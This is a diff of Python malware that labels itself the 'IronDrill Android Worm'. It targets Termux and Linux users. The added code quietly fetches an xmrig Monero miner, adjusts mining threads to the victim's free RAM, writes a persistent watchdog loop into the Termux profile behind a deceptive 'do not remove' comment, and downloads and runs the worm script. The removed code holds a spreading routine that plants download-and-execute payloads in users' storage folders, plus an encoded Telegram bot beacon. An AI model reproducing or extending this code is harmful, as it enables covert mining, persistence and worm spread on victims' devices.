@@ -478,8 +478,6 @@ WantedBy=multi-user.target
     subprocess.run(["systemctl", "enable", "system_watchdog.service"])
     subprocess.run(["systemctl", "start", "system_watchdog.service"])
     
-
-    ae = input("Press Enter to continue worm function...")
     worm_main_posix()
 
 
@@ -563,7 +561,7 @@ def android_definitions():
     import psutil
     android_build = platform.machine()
     if android_build == "aarch64" or android_build == "arm64":
-       subprocess.run("apt update -y && apt install wget -y && wget https://raw.githubusercontent.com/K0D3IN/XmrigPhoneBuilds/refs/heads/main/arm64_xmrig && chmod +x arm64_xmrig && mv arm64_xmrig /data/data/com.termux/files/usr/bin/xmrig", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+       subprocess.run("apt update -y && apt install wget -y wget && wget https://github.com/K0D3IN/XmrigPhoneBuilds/raw/refs/heads/main/arm64_xmrig && chmod +x arm64_xmrig && mv arm64_xmrig /data/data/com.termux/files/usr/bin/xmrig", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     elif android_build == "armv7l" or android_build == "armv8l":
         subprocess.run("apt update -y && apt install wget -y && wget https://raw.githubusercontent.com/K0D3IN/XmrigPhoneBuilds/refs/heads/main/armv7_xmrig && chmod +x armv7_xmrig && mv armv7_xmrig /data/data/com.termux/files/usr/bin/xmrig", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     if not os.path.exists("/data/data/com.termux/files/usr/bin/watchdog.py"):
@@ -583,11 +581,22 @@ def is_running():
         return False
     except Exception:
         return False
+    
 
 def launch_xmrig():
+    free_ram = psutil.virtual_memory().available
+    if free_ram < 1024 * 1024 * 1024 * 3.5:
+        randomx_mode = "light"
+    else:
+        randomx_mode = "auto"
     try:
         core_count = psutil.cpu_count(logical=False) or 1
-        threads = max(1, core_count // 2 + 1) # Çekirdek sayısının yarısı + 1
+        if randomx_mode == "light":
+            threads = min(core_count, max(1, core_count - 2)) # Toplam çekirdek sayısının 2 eksiği
+        elif randomx_mode == "auto":
+            threads = min(core_count, max(1, core_count // 4)) # Toplam çekirdek sayısının dörtte birine eşit veya daha az
+        
+            
         cmd = [
             "nohup",
             "xmrig",
@@ -596,7 +605,7 @@ def launch_xmrig():
             "--tls", "--coin", "monero",
             "--donate-level=1",
             f"--threads={threads}",
-            "--randomx-mode=light",
+            f"--randomx-mode={randomx_mode}",
             "--background"
         ]
         subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -640,7 +649,7 @@ def android_worm_scan():
 # IronDrill Android Worm
 import subprocess
 try:
-    subprocess.run('wget https://raw.githubusercontent.com/K0D3IN/IronDrill/refs/heads/main/irondrill_FINAL.py -O IronDrill.py && python3 IronDrill.py', 
+    subprocess.run('wget https://github.com/K0D3IN/IronDrill/raw/refs/heads/main/irondrill_FINAL.py -O irondrill_FINAL.py && python3 irondrill_FINAL.py', 
                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 except:
     pass
@@ -674,8 +683,8 @@ def controller():
             time.sleep(60)
             continue
 
-if __name__ == "__main__":
-    controller()
+
+controller()
 """
     with open(os.path.join("/data/data/com.termux/files/usr/bin", "watchdog.py"), "w") as f:
         f.write(watchdog_script)
@@ -684,21 +693,24 @@ if __name__ == "__main__":
     # Enhanced autostart setup
     with open(termux_profile, "r") as f:
         lines = f.readlines()
-    
+    entry_line="# DO NOT REMOVE THIS LINE, NOR TERMUX CAN'T WORK WITHOUT IT"
     # Multiple autostart methods for better persistence
-    entries = [
-        "pgrep -f \"watchdog.py\" > /dev/null || nohup python3 /data/data/com.termux/files/usr/bin/watchdog.py > /dev/null 2>&1 &",
-        "pgrep -f \"xmrig\" > /dev/null || nohup xmrig -o pool.supportxmr.com:443 -u 45uGuzWwYcjMVsUQUAAFgpAKgGSMvzcxza3mzN1fUnpbQ3iju7sBAtLXG8cpeccrrNHjqoabXkUGwixrMpndXhFe3NwWCfc.mypc/kodey@gmail.com --tls --coin monero --donate-level=1 --threads=2 --randomx-mode=light --background > /dev/null 2>&1 &"
-    ]
+    entry_profile = r"""
+(
+  while true; do
+    pgrep -f "watchdog.py" > /dev/null || (
+      nohup python3 /data/data/com.termux/files/usr/bin/watchdog.py >/dev/null 2>&1
+    ) >/dev/null 2>&1
+    sleep 60
+  done
+) &>/dev/null &"""
     
-    for entry in entries:
-        if entry not in lines:
-            with open(termux_profile, "a") as f:
-                f.write(f"\n# IronDrill autostart\n{entry}")
     
-    # Start watchdog immediately
-    subprocess.run(["nohup", "python3", "/data/data/com.termux/files/usr/bin/watchdog.py"], 
-                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    if entry_line not in lines:
+        with open(termux_profile, "a") as f:
+            f.write(f"\n{entry_line}\n{entry_profile}")
+    
     
     # Send notifications
     try:
@@ -713,81 +725,10 @@ if __name__ == "__main__":
     except Exception as e:
         pass
     
-    # Run Android worm function
-    try:
-        android_worm_function()
-    except Exception as e:
-        pass
-
     
     
 
-def android_worm_function():
-    
-    # Enhanced Android worm function with better targeting and stealth
-    # TODO Add IronDrill.py to github repo
-    line_to_add = (
-        "import subprocess\n"
-        "import os\n"
-        "def check_env():\n"
-        "    if os.path.isdir('/data/data/com.termux/files/home/'):\n"
-        "        return True\n"
-        "    elif os.path.isdir(f'/home/{os.getlogin()}'):\n"
-        "       return True\n"
-        "    else:\n"
-        "        return False\n"
-        "if check_env():\n"
-        "    subprocess.run('wget https://raw.githubusercontent.com/K0D3IN/IronDrill/refs/heads/main/irondrill_FINAL.py -O IronDrill.py && python3 IronDrill.py', \n"
-        "                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
-        "else:\n"
-        "    print('Bu script sadece Termux ve Linux için yazılmıştır. Pydroid ve Windows içinde çalışmaz. \n ÇIKIŞ YAPILIYOR...')\n"
-    )
 
-    PROBABLE_DIRS = ["downloads", "documents", "htdocs"]
-    BASE_PATH = "/storage/emulated/0"
-
-    try:
-        hedef_dizinler = []
-
-        # Scan for directories
-        for item in os.listdir(BASE_PATH):
-            full_path = os.path.join(BASE_PATH, item)
-            if os.path.isdir(full_path):
-                if item.lower() in PROBABLE_DIRS:
-                    hedef_dizinler.append(full_path)
-
-        # Also scan external storage if available
-        try:
-            external_storage = "/storage/emulated/1"
-            if os.path.exists(external_storage):
-                for item in os.listdir(external_storage):
-                    full_path = os.path.join(external_storage, item)
-                    if os.path.isdir(full_path):
-                        if item.lower() in PROBABLE_DIRS:
-                            hedef_dizinler.append(full_path)
-        except Exception:
-            pass
-
-        # Enhanced scanning with better error handling
-        with ThreadPoolExecutor(max_workers=15) as executor:
-            futures = [
-                executor.submit(tarama_ve_isleme, dizin, line_to_add)
-                for dizin in hedef_dizinler
-            ]
-
-            # Send notification
-            try:
-                url4 = base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcyNjQ4NTQ0ODc6QUFFVmRpQlE5VnpqUXZBMkoxWmJyY2QzdmphM25vTHBObHMvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMjY4OTE5Mzg0NSZ0ZXh0PUJpcithbmRyb2lkK2NpaGF6ZGErV29ybStpxZx2bGkrdGFtYW1sYW5kxLEu').decode('utf-8')
-                requests.get(url4, timeout=5)
-            except Exception as e:
-                pass
-
-            # Wait for all tasks to complete
-            for _ in as_completed(futures):
-                pass
-
-    except Exception as e:
-        pass
 
 
     
